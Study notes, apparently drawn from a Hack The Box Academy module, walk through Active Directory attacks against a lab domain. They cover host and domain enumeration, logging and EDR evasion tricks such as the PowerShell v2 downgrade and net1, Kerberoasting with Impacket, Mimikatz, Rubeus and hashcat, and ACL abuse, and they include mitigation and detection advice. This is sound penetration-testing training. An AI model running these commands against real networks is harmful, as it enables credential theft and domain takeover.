he primary place to look is in the _PowerShell Operational_ Log found under _Applications and Services Logs > Microsoft > Windows > PowerShell > Operational_. All commands executed in our session will log to this file. The Windows PowerShell log located at _Applications and Services Logs > Windows PowerShell_ is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the Windows PowerShell log entries.

Be aware that the action of issuing the command _powershell.exe -version_ 2 within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. 



## Checking Defenses


The next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.

### Firewall Checks
```
PS C:\htb> netsh advfirewall show allprofiles
```

###  Windows Defender Check (from CMD.exe)
```
C:\htb> sc query windefend
```

Above, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.

### Get-MpComputerStatus

```
PS C:\htb> Get-MpComputerStatus
```
Knowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.

## Am I Alone?

When landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.

### Using qwinsta
```
PS C:\htb> qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen

```
Now that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.

### Network Information

```
arp -a 	Lists all known hosts stored in the arp table.
ipconfig /all 	Prints out adapter settings for the host. We can figure out the network segment from here.
route print 	Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
netsh advfirewall show allprofiles 	Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
```

Commands such as ipconfig /all and systeminfo show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. arp -a and route print will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning

### Using arp -a

```
PS C:\htb> arp -a
```

### Viewing the Routing Table
```
PS C:\htb> route print
```

Using arp -a and route print will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.

## Windows Management Instrumentation (WMI)

[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve information and run administrative tasks on local and remote hosts. For our usage, we will create a WMI report on domain users, groups, processes, and other information from our host and other domain hosts.

### Quick WMI checks


```
Command	Description
wmic qfe get Caption,Description,HotFixID,InstalledOn	Prints the patch level and description of the Hotfixes applied

wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List	Displays basic host information to include any attributes within the list

wmic process list /format:list	A listing of all processes on host
wmic ntdomain list /format:list	Displays information about the Domain and Domain Controllers
wmic useraccount list /format:list	Displays information about all local accounts and any domain accounts that have logged into the device
wmic group list /format:list	Information about all local groups
wmic sysaccount list /format:list	Dumps information about any system accounts that are being used as service accounts.

Below we can see information about the domain and the child domain, and the external forest that our current domain has a trust with. This [cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4) has some useful commands for querying host and domain info using wmic.
```
Here's an example:
```
PS C:\htb> wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress
```

## Net Commands
[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:
* Local and domain users
* Groups
* Hosts
* Specific users in groups
* Domain Controllers
* Password requirements

We'll cover a few examples below. Keep in mind that net.exe commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as whoami, and net localgroup administrators, etc. This could be an obvious red flag to anyone monitoring the network heavily.

### Table of Useful Net Commands
```
	Description
net accounts	Information about password requirements
net accounts /domain	Password and lockout policy
net group /domain	Information about domain groups
net group "Domain Admins" /domain	List users with domain admin privileges
net group "domain computers" /domain	List of PCs connected to the domain
net group "Domain Controllers" /domain	List PC accounts of domains controllers
net group <domain_group_name> /domain	User that belongs to the group
net groups /domain	List of domain groups
net localgroup	All available groups
net localgroup administrators /domain	List users that belong to the administrators group inside the domain (the group Domain Admins is included here by default)
net localgroup Administrators	Information about a group (admins)
net localgroup administrators [username] /add	Add user to administrators
net share	Check current shares
net user <ACCOUNT_NAME> /domain	Get information about a user within the domain
net user /domain	List all users of the domain
net user %username%	Information about the current user
net use x: \computer\share	Mount the share locally
net view	Get a list of computers
net view /all /domain[:domainname]	Shares on the domains
net view \computer /ALL	List shares of a computer
net view /domain	List of PCs of the domain
```
### Listing Domain Groups
```
PS C:\htb> net group /domain
```

We can see above the net group command provided us with a list of groups within the domain.

### Information about a Domain User
```
PS C:\htb> net user /domain wrouse
```

### Net Commands Trick
If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing net1 instead of net will execute the same functions without the potential trigger from the net string.

## Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, dsquery will exist on any host with the Active Directory Domain Services Role installed, and the dsquery DLL exists on all modern Windows systems by default now and can be found at C:\Windows\System32\dsquery.dll.

### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a SYSTEM context. Below, we will show the basic search function with dsquery and a few helpful search filters.

### User Search
```
PS C:\htb> dsquery user
```
### Computer Search
```
PS C:\htb> dsquery computer
```
We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) to view all objects in an OU, for example.

### Wildcard Search
```
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```
We can, of course, combine dsquery with LDAP search filters of our choosing. The below looks for users with the PASSWD_NOTREQD flag set in the userAccountControl attribute.

### Users With Specific Attributes Set (PASSWD_NOTREQD)
```
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```
The below search filter looks for all Domain Controllers in the current domain, limiting to five results.

### Searching for Domain Controllers
```
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

# Kerberoasting - from Linux
## Kerberoasting Overview

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

## Kerberoasting - Performing the Attack
Depending on your position in a network, this attack can be performed in multiple ways:
 * From a non-domain joined Linux host using valid domain user credentials.
 * From a domain-joined Linux host as root after retrieving the keytab file.
 * From a domain-joined Windows host authenticated as a domain user.
 * From a domain-joined Windows host with a shell in the context of a domain account.
 * As SYSTEM on a domain-joined Windows host.
 * From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:
 * Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
 * A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
 * From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.


Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

## Efficacy of the Attack

While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access. I would likely write up the finding as high-risk in my report in the first two cases. In the third case, we may Kerberoast and end up unable to crack a single TGS ticket, even after days of cracking attempts with Hashcat on a powerful GPU password cracking rig. In this scenario, I would still write up the finding, but I would drop it down to a medium-risk issue to make the client aware of the risk of SPNs in the domain (these strong passwords could always be changed to something weaker or a very determined attacker may be able to crack the tickets using Hashcat), but take into account the fact that I was unable to take control of any domain accounts using the attack. It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.

## Performing the Attack

Kerberoasting attacks are easily done now using automated tools and scripts. We will cover performing this attack in various ways, both from a Linux and a Windows attack host.

## Kerberoasting with GetUserSPNs.py

Let's start by installing the Impacket toolkit, which we can grab from [Here](https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:

### Installing Impacket using Pip
```
sudo python3 -m pip install .
```

This will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host. Impacket is already installed on the attack host that we can spawn at the end of this section to follow along and work through the exercises. Running the tool with the -h flag will bring up the help menu.

### Listing GetUserSPNs.py Help Options
```
GetUserSPNs.py -h
```

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

### Listing SPN Accounts with GetUserSPNs.py
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
We can now pull all TGS tickets for offline processing using the *-request* flag. The TGS tickets will be output in a format that can be readily provided to Hashcat or John the Ripper for offline password cracking attempts.

### Requesting all TGS Tickets 
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the sqldev account.

### Requesting a Single TGS ticket
```
 GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.

To facilitate offline cracking, it is always good to use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.

### Saving the TGS Ticket to an Output File
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```
Here we've written the TGS ticket for the sqldev user to a file named sqldev_tgs. Now we can attempt to crack the ticket offline using Hashcat hash mode 13100.

### Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```
We've successfully cracked the user's password as database!. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.

### Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

# Kerberoasting - from Windows
## Kerberoasting - Semi Manual method

Before tools such as Rubeus existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in setspn binary to enumerate SPNs in the domain.

### Enumerating SPNs with setspn.exe
```
setspn.exe -Q */*
```
We will notice many different SPNs returned for the various hosts in the domain. We will focus on user accounts and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz. Let's try this by targeting a single user:

### Targeting a Single User
```
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb>New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by Rubeus when using the default Kerberoasting method):
 * The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object.
 * The -AssemblyName parameter allows us to specify an assembly that contains types that we are interested in using
 * System.IdentityModel is a namespace that contains different classes for building security token services
 * We'll then use the New-Object cmdlet to create an instance of a .NET Framework object
 * We'll use the System.IdentityModel.Tokens namespace with the KerberosRequestorSecurityToken class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

### Retrieving All Tickets Using setspn.exe

```
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

The above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.

Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

## Extracting Tickets from Memory with Mimikatz

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export 
```
If we do not specify the base64 /out:true command, Mimikatz will extract the tickets and write them to .kirbi files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

### Preparing the Base64 Blob for Cracking
```
echo "<base64 blob>" |  tr -d \\n 
```
### Placing the Output into a File as .kirbi
```
cat encoded_file | base64 -d > sqldev.kirbi
```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the kirbi2john.py tool to extract the Kerberos ticket from the TGS file.

### Extracting the Kerberos Ticket using kirbi2john.py
```
python2.7 kirbi2john.py sqldev.kirbi
# This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
```

### Modifiying crack_file for Hashcat
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
### Viewing the Prepared Hash
```
cat sqldev_tgs_hashcat 
```

### Cracking the Hash with Hashcat
```
 hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

If we decide to skip the base64 output with Mimikatz and type```mimikatz # kerberos::list /export```, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run kirbi2john.py against them directly, skipping the base64 decoding step.


## Automated / Tool Based Route

Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.

### Using PowerView to Enumerate SPN Accounts
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname
# From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
```
### Using PowerView to Target a Specific User
```
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
# Finally, we can export all tickets to a CSV file for offline processing.
```

### Exporting All Tickets to a CSV File
```
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```
### Viewing the Contents of the .CSV File
```
PS C:\htb> cat .\ilfreight_tgs.csv
```
We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.

### Using Rubeus
```
PS C:\htb> .\Rubeus.exe
```

s we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks. Some options include:
 * Performing Kerberoasting and outputting hashes to a file
 * Using alternate credentials
 * Performing Kerberoasting combined with a pass-the-ticket attack
 * Performing "opsec" Kerberoasting to filter out AES-enabled accounts
 * Requesting tickets for accounts passwords set between a specific date range
 * Placing a limit on the number of tickets requested
 * Performing AES Kerberoasting

### Using the /stats Flag
```
PS C:\htb> .\Rubeus.exe kerberoast /stats
```
Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

### Using the /nowrap Flag
```
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
```
Checking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. [The chart here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.

```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
Next, let's crack this ticket using Hashcat and note how long it took.

### Cracking the Ticket with Hashcat & rockyou.txt
```
hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
```
Let's assume that our client has set SPN accounts to support AES 128/256 encryption. Active Directory Users and Computers window showing properties for user 'testspn' with account options and logon settings. If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.

### Checking Supported Encryption Types
```
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

### Requesting a New Ticket
```
PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
```
To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96) per the handy Hashcat [example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing s to see the status of the cracking job.

### Running Hashcat & Checking the Status of the Cracking Job
```
hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
```
We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use. 


## Mitigation & Detection

An important mitigation for non-managed service accounts is to set a long and complex password or passphrase that does not appear in any word list and would take far too long to crack. However, it is recommended to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with LAPS.

Kerberoasting requests Kerberos TGS tickets with RC4 encryption, which should not be the majority of Kerberos activity within a domain. When Kerberoasting is occurring in the environment, we will see an abnormal number of TGS-REQ and TGS-REP requests and responses, signaling the use of automated Kerberoasting tools. Domain controllers can be configured to log Kerberos TGS ticket requests by selecting [Audit Kerberos Service Ticket Operations](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-kerberos-service-ticket-operations) within Group Policy.


Doing so will generate two separate event IDs: [4769](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4769): A Kerberos service ticket was requested, and [4770](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4770): A Kerberos service ticket was renewed. 10-20 Kerberos TGS requests for a given account can be considered normal in a given environment. A large amount of 4769 event IDs from one account within a short period may indicate an attack.

Some other remediation steps include restricting the use of the RC4 algorithm, particularly for Kerberos requests by service accounts. This must be tested to make sure nothing breaks within the environment. Furthermore, Domain Admins and other highly privileged accounts should not be used as SPN accounts (if SPN accounts must exist in the environment).

[This excellent post by Sean Metcalf highlights some mitigation and detection strategies for Kerberoasting](https://adsecurity.org/?p=3458).

## Continuing Onwards

Now that we have a set of (hopefully privileged) credentials, we can move on to see where we can use the credentials. We may be able to:
 * Access a host via RDP or WinRM as a local user or a local admin
 * Authenticate to a remote host as an admin using a tool such as PsExec
 * Gain access to a sensitive file share
 * Gain MSSQL access to a host as a DBA user, which can then be leveraged to escalate privileges

Regardless of our access, we will also want to dig deeper into the domain for other flaws and misconfigurations that can help us expand our access and add to our report to provide more value to our clients.

# Access Control List (ACL) Abuse Primer
In their simplest form, ACLs are lists that define a) who has access to which asset/resource and b) the level of access they are provisioned. The settings themselves in an ACL are called Access Control Entries (ACEs). Each ACE maps back to a user, group, or process (also known as security principals) and defines the rights granted to that principal. Every object has an ACL, but can have multiple ACEs because multiple security principals can access objects in AD. ACLs can also be used for auditing access within AD.

There are two types of ACLs:
 * **Discretionary Access Control List (DACL) :**  defines which security principals are granted or denied access to an object. DACLs are made up of ACEs that either allow or deny access. When someone attempts to access an object, the system will check the DACL for the level of access that is permitted. If a DACL does not exist for an object, all who attempt to access the object are granted full rights. If a DACL exists, but does not have any ACE entries specifying specific security settings, the system will deny access to all users, groups, or processes attempting to access it.
 * **System Access Control Lists (SACL) :** allow administrators to log access attempts made to secured objects.

## Access Control Entries (ACEs)

As stated previously, Access Control Lists (ACLs) contain ACE entries that name a user or group and the level of access they have over a given securable object. There are three main types of ACEs that can be applied to all securable objects in AD:
```

ACE 	Description
Access denied ACE 	Used within a DACL to show that a user or group is explicitly denied access to an object
Access allowed ACE 	Used within a DACL to show that a user or group is explicitly granted access to an object
System audit ACE 	Used within a SACL to generate audit logs when a user or group attempts to access an object. It records whether access was granted or not and what type of access occurred
```

Each ACE is made up of the following four components:
 * The security identifier (SID) of the user/group that has access to the object (or principal name graphically)
 * A flag denoting the type of ACE (access denied, allowed, or system audit ACE)
 * A set of flags that specify whether or not child containers/objects can inherit the given ACE entry from the primary or parent object
 * An [access mask](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b62eb790b?redirectedfrom=MSDN) which is a 32-bit value that defines the rights granted to an object

## Why are ACEs Important?

Attackers utilize ACE entries to either further access or establish persistence. These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the impact that these can have if applied incorrectly. They cannot be detected by vulnerability scanning tools, and often go unchecked for many years, especially in large and complex environments. During an assessment where the client has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:
 * ForceChangePassword abused with Set-DomainUserPassword
 * Add Members abused with Add-DomainGroupMember
 * GenericAll abused with Set-DomainUserPassword or Add-DomainGroupMember
 * GenericWrite abused with Set-DomainObject
 * WriteOwner abused with Set-DomainObjectOwner
 * WriteDACL abused with Add-DomainObjectACL
 * AllExtendedRights abused with Set-DomainUserPassword or Add-DomainGroupMember
 * AddSelf abused with Add-DomainGroupMember

In this module, we will cover enumerating and leveraging four specific ACEs to highlight the power of ACL attacks:
 * [ForceChangePassword](https://bloodhound.specterops.io/resources/edges/force-change-password#forcechangepassword) - gives us the right to reset a user's password without first knowing their password (should be used cautiously and typically best to consult our client before resetting passwords).
 * [GenericWrite](https://bloodhound.specterops.io/resources/edges/generic-write#genericwrite) - gives us the right to write to any non-protected attribute on an object. If we have this access over a user, we could assign them an SPN and perform a Kerberoasting attack (which relies on the target account having a weak password set). Over a group means we could add ourselves or another security principal to a given group. Finally, if we have this access over a computer object, we could perform a resource-based constrained delegation attack which is outside the scope of this module.
 * [AddSelf](https://bloodhound.specterops.io/resources/edges/add-self#addself) - shows security groups that a user can add themselves to.
 * [GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all#genericall) - this grants us full control over a target object. Again, depending on if this is granted over a user or group, we could modify group membership, force change a password, or perform a targeted Kerberoasting attack. If we have this access over a computer object and the [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) is in use in the environment, we can read the LAPS password and gain local admin access to the machine which may aid us in lateral movement or privilege escalation in the domain if we can obtain privileged controls or gain some sort of privileged access.


![ACL_attacks_graphic](https://github.com/user-attachments/assets/bebb6a8c-fd71-485a-b7fc-7093b5f5f945)

## ACL Attacks in the Wild

We can use ACL attacks for:
 * Lateral movement
 * Privilege escalation
 * Persistence

Some common attack scenarios may include:
 * **Abusing forgot password permissions :** Help Desk and other IT users are often granted permissions to perform password resets and other privileged tasks. If we can take over an account with these privileges (or an account in a group that confers these privileges on its users), we may be able to perform a password reset for a more privileged account in the domain.
 * **Abusing group membership management:** It's also common to see Help Desk and other staff that have the right to add/remove users from a given group. It is always worth enumerating this further, as sometimes we may be able to add an account that we control into a privileged built-in AD group or a group that grants us some sort of interesting privilege.
 * **Excessive user rights:** We also commonly see user, computer, and group objects with excessive rights that a client is likely unaware of. This could occur after some sort of software install (Exchange, for example, adds many ACL changes into the environment at install time) or some kind of legacy or accidental configuration that gives a user unintended rights. Sometimes we may take over an account that was given certain rights out of convenience or to solve a nagging problem more quickly.

There are many other possible attack scenarios in the world of Active Directory ACLs, but these three are the most common.


# ACL Enumeration
## Enumerating ACLs with PowerView


We can use PowerView to enumerate ACLs, but the task of digging through all of the results will be extremely time-consuming and likely inaccurate. For example, if we run the function Find-InterestingDomainAcl we will receive a massive amount of information back that we would need to dig through to make any sense of:

### Using Find-InterestingDomainAcl
```
PS C:\htb> Find-InterestingDomainAcl
```
If we try to dig through all of this data during a time-boxed assessment, we will likely never get through it all or find anything interesting before the assessment is over. Now, there is a way to use a tool such as PowerView more effectively -- by performing targeted enumeration starting with a user that we have control over. Let's focus on the user wley, which we obtained after solving the last question in the LLMNR/NBT-NS Poisoning - from Linux section. Let's dig in and see if this user has any interesting ACL rights that we could take advantage of. We first need to get the SID of our target user to search effectively.
```
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> $sid = Convert-NameToSid wley

```

We can then use the Get-DomainObjectACL function to perform our targeted search. In the below example, we are using this function to find all domain objects that our user has rights over by mapping the user's SID using the $sid variable to the SecurityIdentifier property which is what tells us who has the given right over an object. One important thing to note is that if we search without the flag ResolveGUIDs, we will see results like the below, where the right ExtendedRight does not give us a clear picture of what ACE entry the user wley has over damundsen. This is because the ObjectAceType property is returning a GUID value that is not human readable.

Note that this command will take a while to run, especially in a large environment. It may take 1-2 minutes to get a result in our lab.
### Using Get-DomainObjectACL
```
PS C:\htb> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```
